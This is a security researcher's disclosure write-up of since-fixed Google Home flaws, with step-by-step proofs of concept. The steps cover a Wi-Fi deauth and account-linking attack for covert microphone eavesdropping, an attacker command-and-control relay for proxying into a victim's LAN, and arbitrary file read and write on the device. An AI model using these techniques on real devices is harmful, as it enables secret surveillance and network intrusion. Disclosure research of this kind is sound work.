<p>The following PoCs have been published here: <a href="https://github.com/DownrightNifty/gh_hack_PoC">https://github.com/DownrightNifty/gh_hack_PoC</a></p>

<p>Since the security issues have been fixed, none of these probably work anymore, but I thought they were worth documenting/preserving.</p>

<h3 id="poc-1-spy-on-victim">PoC #1: Spy on victim</h3>
<p>I made a PoC that works on my Android phone (via Python on <a href="https://termux.com">Termux</a>) to demonstrate how quick and easy the process of linking an account could be. The attack described here could be performed within the span of a few minutes.</p>

<p>For the PoC, I re-implemented the device link and routines APIs in Python, and made the following utilities: <code>google_login.py</code>, <code>link_device.py</code>, <code>reset_volume.py</code>, <code>call_device.py</code>.</p>

<ol>
  <li>Download <a href="https://github.com/protocolbuffers/protobuf/releases">protoc</a> and add it to your PATH</li>
  <li>Install the requirements: <code>pip3 install requests==2.23.0 gpsoauth httpx[http2]</code></li>
  <li>Create the “attacker” Google account</li>
  <li>Log in with <code>python3 google_login.py</code></li>
  <li>Get within wireless proximity of Google Home</li>
  <li>Deauth the Google Home
    <ul>
      <li>Raw packet injection (required for deauth attacks) requires a rooted phone and won’t work on some Wi-Fi chips. I ended up using a NodeMCU, a tiny Wi-Fi development board, going for less than $5 on Amazon, and flashed it with <a href="https://github.com/SpacehuhnTech/esp8266_deauther">spacehuhn’s deauther firmware</a>. You can use its web UI to scan for nearby devices and deauth them. It quickly found my Google Home (manufacturer listed as “Google” based on MAC address prefix) and I was able to deauth it.</li>
    </ul>
  </li>
  <li>Connect to the Google Home’s setup network (named <code>[device name].o</code>)</li>
  <li>Run <code>python3 link_device.py --setup_mode 192.168.255.249</code> to link your account to the device
    <ul>
      <li>In addition to linking your account, to make the attack as stealthy as possible, “night mode” is also enabled on the device, which decreases the maximum volume and LED brightness. Since music volume is unaffected, and the volume decrease is almost entirely suppressed when the volume is greater than 50%, this subtle change is unlikely to be noticed by the victim. However, it makes it so that, at 0% volume, the Assistant voice is completely muted (whereas with night mode off, it can barely still be heard at 0%).</li>
    </ul>
  </li>
  <li>Stop the deauth attack and wait for the device to re-connect to the Internet
    <ul>
      <li>You can run <code>python3 reset_volume.py 4</code> to reset the volume to 40% (since enabling night mode set it to 0%).</li>
    </ul>
  </li>
  <li>Now that your account is linked, you can make the device call your phone number, silently, at any time, over the Internet, allowing you to listen in to the microphone feed.
    <ul>
      <li>To issue a call, run <code>python3 call_device.py [phone number]</code>.</li>
      <li>The commands “set the volume to 0” and “call [number]” are executed on the device remotely using a routine.</li>
      <li>The only thing the victim may notice is that the device’s LEDs turn solid blue, but they’d probably just assume it’s updating the firmware or something. In fact, the official support page describing <a href="https://web.archive.org/web/20210313001622/https://support.google.com/googlenest/answer/7073219?hl=en">what the LED colors mean</a> only says solid blue means “Your speaker needs to be verified by you” and makes no mention of calling. During a call, the LEDs do not pulse like they normally do when the device is listening, so there is no indication that the microphone is open.</li>
    </ul>
  </li>
</ol>

<p>Here’s a video demonstrating what it looks like when a call is initiated remotely:</p>

<iframe width="252px" height="448px" src="https://www.youtube-nocookie.com/embed/2FNctCA7JaI" title="YouTube video player" frameborder="0" allowfullscreen=""></iframe>

<p>As you can see, there is no audible indication that the commands are running, which makes it difficult for the victim to notice. The victim can still use their device normally for the most part (although certain commands, like music playback, don’t work during a call).</p>

<h3 id="poc-2-make-arbitrary-http-requests-on-victims-network">PoC #2: Make arbitrary HTTP requests on victim’s network</h3>
<p>As I described earlier, the attacker can install a smart home action onto the linked device remotely, and leverage the Local Home SDK to make arbitrary HTTP requests within the victim’s LAN. <code>c2.py</code> is the command &amp; control server. <code>app.js</code> and <code>index.html</code> are the local home app.</p>

<ol>
  <li>Configure and start the C&amp;C server:
    <ul>
      <li>Install the requirements: <code>pip3 install mitmproxy websockets</code></li>
      <li>Start the server: <code>mitmdump --listen-port 8000 --set upstream_cert=false --ssl-insecure -s c2.py</code>
        <ul>
          <li>Under the default configuration, a proxy server starts on <code>localhost:8000</code>, and a WebSocket server starts on <code>0.0.0.0:9000</code>. The proxy server acts as a relay, sending requests from programs on your computer (like <code>curl</code>) to the victim’s Google Home through the WebSocket. In a real attack, the WebSocket port would need to be exposed to the Internet so the victim’s Google Home could connect to it, but for local demonstration, it doesn’t have to be.</li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Configure the local home app:
    <ul>
      <li>Change the <code>C2_WS_URL</code> variable at the top of <code>app.js</code> to the WebSocket URL for your C&amp;C server. This needs to be reachable by the Google Home.</li>
      <li>Host the static <code>index.html</code> and <code>app.js</code> files somewhere reachable by the Google Home. For local demonstration, you can spin up a simple file hosting server using <code>python3 -m http.server</code>.</li>
    </ul>
  </li>
  <li>Deploy the local home app to your account:
    <ul>
      <li>Follow <a href="https://github.com/actions-on-google/smart-home-local#configure-the-actions-project">these instructions</a> to create a sample app on your account.</li>
      <li>Add a fake device:
        <div><div><pre><code>npm run firebase --prefix functions/ -- functions:config:set \
    strand1.leds=16 strand1.channel=1 \
    strand1.control_protocol=HTTP
npm run deploy --prefix functions/
</code></pre></div>        </div>
        <ul>
          <li>This tells the cloud fulfillment to include an <code>otherDeviceIds</code> field in responses to <code>SYNC</code> requests. As far as I understand, this is all that’s required to activate local fulfillment; the specific device IDs or attributes you choose don’t matter.</li>
        </ul>
      </li>
      <li>From the Actions Console, go to Develop -&gt; Actions -&gt; Configure local home SDK, and set the “testing URL for Chrome” to the URL of <code>index.html</code>. For local demonstration, this can be a private IP, but it must be reachable by the Google Home.</li>
      <li>Add the following mDNS scan configurations:
        <ul>
          <li>MDNS service name: <code>_googlecast._tcp.local</code></li>
          <li>MDNS service name: <code>_googlezone._tcp.local</code></li>
          <li>MDNS service name: <code>_googlerpc._tcp.local</code></li>
        </ul>
      </li>
      <li>Open Google Assistant settings on your phone, and select “Home Control”, then the “+” sign. Select the app with the <code>[test]</code> prefix to link it.</li>
    </ul>
  </li>
  <li>Get within wireless proximity of the victim’s Google Home, then force it into setup mode, and link your account using the  <code>link_device.py</code> script from PoC #1.</li>
  <li>Reboot the device:
    <ul>
      <li>While still connected to the device’s setup network, send a POST request to the <code>/reboot</code> endpoint with the body <code>{&#34;params&#34;:&#34;now&#34;}</code> and a <code>cast-local-authorization-token</code> header (obtained with <code>HomeGraphAPI.get_local_auth_tokens()</code> from <code>googleapi.py</code>).</li>
      <li>For local demonstration, you can just unplug the Google Home then plug it back in.</li>
    </ul>
  </li>
  <li>Not long after the reboot, the Google Home automatically downloads your local home app and runs it.
    <ul>
      <li>The app waits for the <code>IDENTIFY</code> request it receives when the Google Home finds itself through mDNS scanning, then connects to the Chrome DevTools Protocol WebSocket on port 9222. After connecting to CDP, it opens a WebSocket to your C&amp;C server, and waits for commands. If disconnected from either CDP or the C&amp;C server, it automatically tries to reconnect every 5 seconds.</li>
      <li>Once loaded, it seems to run indefinitely. The documentation says apps may be killed if they consume too much memory, but I haven’t run into this, and I’ve even left my app running overnight. If the Google Home is rebooted, the app will reload.</li>
    </ul>
  </li>
</ol>

<p>Now, you can send HTTP(S) requests on the victim’s private LAN, as if you had the WiFi password, even though you don’t (yet), by configuring a program on your computer to route its traffic through the local proxy server, which in turn routes it to the Google Home. For example, <code>curl --proxy &#39;localhost:8000&#39; --insecure -v https://localhost:8443/setup/eureka_info</code> returns the Google Home’s info, because through the proxy, <code>localhost</code> resolves to the Google Home’s IP. The JSON response to <code>/setup/eureka_info</code> contains the IP, which is helpful for determining the layout of the LAN.</p>

<p>I was even able to route Chrome through the proxy, with <code>chrome --proxy-server=&#39;localhost:8000&#39; --ignore-certificate-errors --user-data-dir=&#39;SOME_DIR&#39;</code>, and it worked surprisingly well.</p>

<p>Obviously, the ability to send requests on the private LAN opens a large attack surface. Using the IP of the Google Home, you can determine the subnet that the victim’s other devices are on. For example, my Google Home’s IP is <code>192.168.86.132</code>, so I could guess that my other devices are in the  <code>192.168.86.0</code> to <code>192.168.86.255</code> range. You could write a simple script to <code>curl</code> every possible address, looking for devices on the LAN to attack or steal data from. Since it only takes a few seconds to check each IP, it would only take around 10 minutes to try every one. On my LAN, I found my printer’s web interface at <code>http://192.168.86.33</code>. Its network settings page contains an <code>&lt;input type=&#34;password&#34;&gt;</code> pre-filled with my WiFi password in plaintext. It also provides a firmware update mechanism, which I imagine could be vulnerable to attack.</p>

<p>Another approach would be looking for the victim’s router and trying to attack that. My router’s IP, <code>192.168.1.254</code>, shows up among the first results when you Google “default router IPs”. You could write a script to try these. My router’s configuration interface also immediately returns my WiFi password in plaintext. Luckily, I’ve changed the default admin password, so at the very least an attacker with access to it wouldn’t be able to modify the settings, but most people don’t change this password, so you could find it by searching for “[brand name] router password”, then set the DNS server to your own, install malicious firmware updates, etc. Even if the victim changed their router’s password, it may still be vulnerable. For example, in June 2020, a researcher <a href="https://blog.grimm-co.com/2020/06/soho-device-exploitation.html">found a buffer overflow vulnerability</a> in the web interface on 79 Netgear router models that led to a root shell, and described the process as “easy”.</p>

<h3 id="poc-3-readwrite-arbitrary-files-on-device">PoC #3: Read/write arbitrary files on device</h3>
<p>I also found a way to read/write arbitrary files on the linked device using the <code>DOM.setFileInputFiles</code> and <code>Page.setDownloadBehavior</code> methods of the Chrome DevTools Protocol.</p>

<p>The following reproduction steps first write a file, <code>/tmp/example_file.txt</code>, then read it back to verify that it worked.</p>

<ol>
  <li>Enable remote debugging on the Google Home:
    <ul>
      <li>Follow <a href="https://github.com/actions-on-google/smart-home-local">these instructions</a> using a Google account linked to the device.</li>
    </ul>
  </li>
  <li>Install the requirements:
    <div><div><pre><code>npm install ws
pip install flask
</code></pre></div>    </div>
  </li>
  <li>Create an <code>example_file.txt</code>, e.g. <code>echo &#39;test&#39; &gt; example_file.txt</code></li>
  <li>Run <code>python3 write_server.py example_file.txt</code>. You can optionally modify the <code>HOST</code> or <code>PORT</code> variables at the top of the script. Get the URL of the server, like <code>http://[IP]:[port]</code>. This must be reachable by the Google Home.</li>
  <li>Run <code>node write.js [Google Home IP] [write server URL] /tmp</code>, inserting the appropriate values. You can get the Google Home’s IP from the Google Home app. The file will be written to <code>/tmp/example_file.txt</code>.</li>
  <li>Run <code>python3 read_server.py</code>. You can modify the host/port like before.</li>
  <li>Run <code>node read.js [Google Home IP] [read server URL]</code>. When prompted for a file path to read, enter <code>/tmp/example_file.txt</code>.</li>
  <li>Verify that <code>example_file.txt</code> was dumped from the device to <code>dumped_files/example_file.txt</code></li>
</ol>

<p>Since I couldn’t explore the filesystem of my Google Home (and <code>&lt;input type=&#34;file&#34; webkitdirectory&gt;</code> didn’t work to upload folders instead of files), I’m not sure exactly what the impact of this was. I was able to find some info about the filesystem structure from the “open source licenses” info, and from the <a href="#prior-research">DEFCON talk</a> on the Google Home. I dumped a few binaries like <code>/system/chrome/cast_shell</code> and <code>/system/chrome/lib/libassistant.so</code>, then ran <code>strings</code> on them, looking for interesting files to steal or tamper with. It looks like <code>/data/chrome/chirp/assistant/cookie</code> may contain user info? <code>/data/chrome/chirp/assistant/settings</code> and <code>/data/chrome/chirp/assistant/phenotype_package_store</code> both contain the GAIA IDs of the accounts linked to my Google Home. I was able to dump <code>/data/chrome/chirp/assistant/nightmode/nightmode_params</code>, hex edit it, and overwrite the original with my modified version, and the changes were applied after a reboot. If, for example, a bug in a config file parser was found, I imagine that this could have potentially led to RCE?</p>

<h2 id="the-fixes">The fixes</h2>
<p>I’m aware of the following fixes deployed by Google:</p>

<ul>
  <li>You must request an invite to the “Home” that the device is registered to in order to link your account to it through the <code>/deviceuserlinksbatch</code> API. If you’re not added to the Home but you try to link your account this way, you’ll get a <code>PERMISSION_DENIED</code> error.</li>
  <li>“Call [phone number]” commands can’t be initiated remotely through routines.</li>
</ul>

<p>You can still deauth the Google Home and access its device info through the <code>/setup/eureka_info</code> endpoint, but you can’t use it to link your account anymore, and you can’t access the rest of the local API (because you can’t get a local auth token).</p>

<p>On devices with a display (e.g. Google Nest Hub), the setup network is protected with a WPA2 password which appears as a QR code on the display (scanned with the Google Home app), which adds an additional layer of protection.</p>

<p>Additionally, on these devices, you can say “add my voice” to bring up a screen with a link code instructing you to visit <a href="https://g.co/nest/voice">https://g.co/nest/voice</a>. You can link your account to the device through this website, even if you aren’t added to its Home (which is fine, because this still requires physical access to the device). The “add my voice” command doesn’t appear to work on the Google Home Mini, probably since it doesn’t have a display that it can use to provide a link code. I guess if Google wanted to implement this, they could make it speak the link code out loud or text it to a provided phone number or something.</p>

<h2 id="reflectionconclusions">Reflection/conclusions</h2>
<p>Google Home’s architecture is based on Chromecast. Chromecast doesn’t place much emphasis on security against proximity-based attacks because it’s mostly unnecessary. What’s the worst that could happen if someone hacks your Chromecast? Maybe they could play obscene videos? However, the Google Home is a much more security-critical device, due to the fact that it has control over your other smart home devices, and a microphone. If the Google Home architecture had been built from scratch, I imagine that these issues would have never existed.</p>

<p>Ever since the first Google Home device released in November 2016, Google continued to add more and more features to the device’s cloud APIs as time went on, like scheduled routines (<a href="https://9to5google.com/2018/07/26/google-assistant-custom-routines-schedule/">July 2018</a>) and the Local Home SDK (<a href="https://developers.googleblog.com/2020/04/local-home-sdk-ready-for-actions.html">April 2020</a>). I’m guessing that the engineers behind these features were under the assumption that the account linking process was secure.</p>

<p>Many other security researchers had already given the Google Home a look before me, but somehow it appears that none of them noticed these seemingly glaring issues. I guess they were mainly focused on the endpoints that the local API exposed and what an attacker could do with those. However, these endpoints only allow for adjusting a few basic device settings, and not much else. While the issues I discovered may seem obvious in hindsight, I think that they were actually pretty subtle. Rather than making a local API request to control the device, you instead make a local API request to retrieve innocuous-looking device info, and use that info along with cloud APIs to control the device.</p>

<p>As the <a href="#prior-research">DEFCON talk</a> shows, the low-level security of the device is generally pretty good, and buffer overflows and such are hard to come by. The issues I found were lurking at the high level.</p>

<p>Many thanks to Google for the incredibly generous rewards!</p>

<h2 id="disclosure-timeline">Disclosure timeline</h2>
<ul>
  <li>01/08/2021: Reported</li>
  <li>01/10/2021: Triaged</li>
  <li>01/20/2021: Closed (Intended Behavior)</li>
  <li>I was busy with school stuff, so it took me a while to respond</li>
  <li>03/11/2021: Sent additional details and PoC</li>
  <li>03/19/2021: Reopened</li>
  <li>04/07/2021: Sent additional details</li>
  <li>04/20/2021: Reward received</li>
  <li>04/05/2022: <a href="https://security.googleblog.com/2022/04/find-and-eek-increased-rewards-for.html">Google announced increased rewards for Google Nest and Fitbit devices</a></li>
  <li>05/04/2022: Bonus rewards received</li>
</ul>

<h2 id="prior-research">Prior research</h2>
<p>Here are some articles I found during my research on Google Home devices that I thought were interesting:</p>

<ul>
  <li>July 2014: <a href="https://www.wired.com/2014/07/rickroll-innocent-televisions-with-this-google-chromecast-hack/">“RickMote” Chromecast hijacking</a></li>
  <li>August 2014: <a href="https://fail0verflow.com/blog/2014/hubcap-chromecast-root-pt1/">Chromecast secure boot bypass (requires physical access)</a></li>
  <li>January 2018: <a href="https://github.com/rithvikvibhu/GHLocalApi">Unofficial documentation of Google Home local API</a></li>
  <li>June 2018: <a href="https://www.tripwire.com/state-of-security/vert/googles-newest-feature-find-my-home/">DNS rebinding attack allows any website to access local API</a></li>
  <li>October 2018: <a href="https://www.androidauthority.com/google-home-hub-security-920291/">‘No evidence user information at risk’ says Google regarding Home Hub security</a></li>
  <li>January 2019: <a href="https://web.archive.org/web/20211114052648/https://casthack.thehackergiraffe.com/">CastHack</a></li>
  <li>June 2019: <a href="https://github.com/rithvikvibhu/GHLocalApi/issues/39">Local API now requires an auth token</a></li>
  <li>August 2019: <a href="https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON-27-Wenxiang-Qian-Yuxiang-Li-Huiyu-Wu-Breaking-Google-Home-Exploit-It-with-SQLite-Magellan.pdf">DEFCON talk on Google Home</a></li>
  <li>November 2019: <a href="https://lightcommands.com/">“Light Commands” attack</a></li>
  <li>July 2020: <a href="https://courk.cc/running-custom-code-google-home-mini-part1">Google Home Mini secure boot bypass (requires physical access)</a></li>
</ul>


<p>During my research, I did a little digging within the Google Home app. I didn’t find any security issues here, but I did discover some things about the local API that the unofficial docs don’t yet include.</p>

<h3 id="show_led-endpoint"><code>show_led</code> endpoint</h3>
<p>To find a list of local API endpoints (and potentially some undocumented ones), I searched for a known endpoint (<code>get_app_device_id</code>) in the decompiled sources:</p>

<p><img src="https://downrightnifty.me/assets/gh_hack/endpoint_search.png" alt=""/></p>

<p>The information I was looking for was in <code>defpackage/ufo.java</code>:</p>

<p><img src="https://downrightnifty.me/assets/gh_hack/endpoint_list.png" alt=""/></p>

<p><code>SHOW_LED</code> sounded interesting, and it wasn’t in the unofficial docs. Searching for where this constant is used led me to <code>StereoPairCreationActivity</code>:</p>

<p><img src="https://downrightnifty.me/assets/gh_hack/show_led_usage.png" alt=""/></p>

<p>With the help of JADX’s amazing “rename symbol” feature, and after renaming some methods, I was able to find the class responsible for constructing the JSON payload for this endpoint:</p>

<p><img src="https://downrightnifty.me/assets/gh_hack/show_led_client.png" alt=""/></p>

<p>Looks like the payload consists of an integer <code>animation_id</code>. We can send use the endpoint like so:</p>

<div><div><pre><code>$ curl --insecure -X POST -H &#39;cast-local-authorization-token: [token]&#39; -H &#39;Content-Type: application/json&#39; -d &#39;{&#34;animation_id&#34;:2}&#39; https://[Google Home IP]:8443/setup/assistant/show_led</code></pre></div></div>

<p>This makes the LEDs play a slow pulsing animation. Unfortunately it seems that there are only two animations: <code>1</code> (reset LEDs to normal) and <code>2</code> (continuous pulsing). Oh, well.</p>

<h3 id="wi-fi-password-encryption">Wi-Fi password encryption</h3>
<p>I was also able to find the algorithm used to encrypt the user’s Wi-Fi password before sending it through the <code>/setup/connect_wifi</code> endpoint. Now that HTTPS is used, this encryption seems redundant, but I imagine that this was originally implemented to protect against <a href="https://www.bitdefender.com/files/News/CaseStudies/study/294/Bitdefender-WhitePaper-RDoor-CREA3949-en-EN-GenericUse.pdf">MITM attacks exposing the Wi-Fi password</a>. Anyway, we see that the password is encrypted using RSA PKCS1 and the device’s public key (from <code>/setup/eureka_info</code>):</p>

<p><img src="https://downrightnifty.me/assets/gh_hack/wifi_encryption.png" alt=""/></p>


<p>I mentioned above that the Google Home Mini doesn’t support WPA3, nor 802.11w. I’d like to clarify how I discovered this.</p>

<p>Since my router doesn’t support these, I borrowed a friend’s router running <a href="https://openwrt.org/">OpenWrt</a>, a FOSS operating system for routers, which does support 802.11w and WPA3.</p>

<p>There are three 802.11w modes you can choose from: disabled (default), optional, and required. (“Optional” means that it’s used only for devices that support it.) While I was using “required”, my Google Home Mini was unable to connect, meanwhile my Pixel 5 (Android 12) and MacBook Pro (macOS 12.4) had no issues. Same results when I enabled WPA3. I tried “optional” and the Google Home Mini connected, but was still vulnerable to deauth attacks (as expected).</p>

<p>I tested this on the latest Google Home Mini firmware at the time of writing (1.56.309385, August 2022), on 1st gen (codename <code>mushroom</code>) hardware. I’m assuming this is a limitation of the Wi-Fi chip that it uses, rather than a software issue.</p>

  </div>
</article></div>
  </body>
</html>
